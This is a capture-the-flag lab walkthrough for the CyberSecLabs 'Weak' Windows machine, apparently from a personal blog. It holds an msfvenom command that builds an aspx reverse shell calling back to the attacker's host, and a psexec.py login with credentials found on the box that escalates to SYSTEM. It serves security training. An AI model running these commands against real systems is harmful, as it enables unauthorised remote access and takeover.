---
layout: page
title: Weak - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/weak.html
---

# Weak - CyberSecLabs
----

First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.11`

![image](https://user-images.githubusercontent.com/50459517/103789467-a9dfb100-5005-11eb-9164-5fb734a473da.png)

Looks like we have serveral interesting ports open.  First thing I notice in the nmap output is the FTP results.  It looks like the contents for anonymous login are files found in a default IIS page.  We have IIS running on port 80 so lets see if it is a default page or not.

![image](https://user-images.githubusercontent.com/50459517/103789497-b49a4600-5005-11eb-9882-88dc5d139acc.png)

It is!  Lets test and see if this FTP server is linked to the root of this web server.  We can test this by putting a file on the server via FTP and then access it via HTTP.  If it works, we may be able to execute a script via HTTP that could give us a shell!

![image](https://user-images.githubusercontent.com/50459517/103789528-bfed7180-5005-11eb-880b-0f807fc2c88a.png)

I was getting an error saying the server cannot accept the argument **ls** which I had never seen before.  I looked this up and decided to see what wireshark showed when I sent the **ls** command.

![image](https://user-images.githubusercontent.com/50459517/103789571-c976d980-5005-11eb-9824-41e38f57b896.png)

It looks like it is using the **PORT** command with some arguments that look like my IP address which I'm not for sure why.  I read up and someone suggested to try in passive mode as it may be a connection issue with active mode.  So I switched and now everything seems good.

![image](https://user-images.githubusercontent.com/50459517/103789600-d4316e80-5005-11eb-88aa-1c643e9066f7.png)

I put the file **test.txt** on the server via FTP and accessed with HTTP successfully.

![image](https://user-images.githubusercontent.com/50459517/103789632-dd224000-5005-11eb-9243-7e27958ca040.png)

![image](https://user-images.githubusercontent.com/50459517/103789672-e6aba800-5005-11eb-8370-90af3b93904f.png)

Now lets try to generate an aspx payload with **msfvenom**.  We will use a x64 payload first and see what we get.  If it fails we may try an x86 instead.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.11 LPORT=1337 -f aspx > shell.aspx`

![image](https://user-images.githubusercontent.com/50459517/103789705-ee6b4c80-5005-11eb-83c8-7e55afc2fa54.png)

Now we will copy the payload to the server, start a netcat listener, and execute via HTTP.

![image](https://user-images.githubusercontent.com/50459517/103789813-0ba01b00-5006-11eb-86a7-0934c61831ae.png)

![image](https://user-images.githubusercontent.com/50459517/103789853-15c21980-5006-11eb-9051-2acac552760b.png)

![image](https://user-images.githubusercontent.com/50459517/103789879-1e1a5480-5006-11eb-822b-21cae0485074.png)

We have a shell as low level user.  Awesome!  Now time to escalate.

After some manual enumeration, we find a directory on the root of the hard drive called **Development** which looks interesting.  Inside is a file called **README.txt** so lets look at its contents.

![image](https://user-images.githubusercontent.com/50459517/103789906-283c5300-5006-11eb-991c-8e4d09e94fbc.png)

Hmmm.  Looks like someone is using an insecure password.  We can assume it is not the administrator account since this note seems to be signed by the Administrator.  Lets look and see what users we may have on this machine.

![image](https://user-images.githubusercontent.com/50459517/103789933-31c5bb00-5006-11eb-9fe8-e03b0eac3fbb.png)

Since we are currently Alpha Site, lets see if we can authenticate with Web Admin.  I tried a few default passwords like **admin**, **password**, etc. All failed and I thought I would try to brute force untill I tried "**Password"** which is what was in the **README** file.  I got a message saying it could not access because of insufficient user privileges.  This is good as it indicates we have a valid set of creds, just can't be used via RDP.

![image](https://user-images.githubusercontent.com/50459517/103789965-3b4f2300-5006-11eb-874e-086a8ab17961.png)

So since we have SMB services running, lets try to get a shell with **psexec**

`psexec.py](http://psexec.py/) 'Web Admin':'Password'@172.31.1.11`

![image](https://user-images.githubusercontent.com/50459517/103790016-499d3f00-5006-11eb-8bf9-e4444be80986.png)

There we go.  We are now System on the machine!
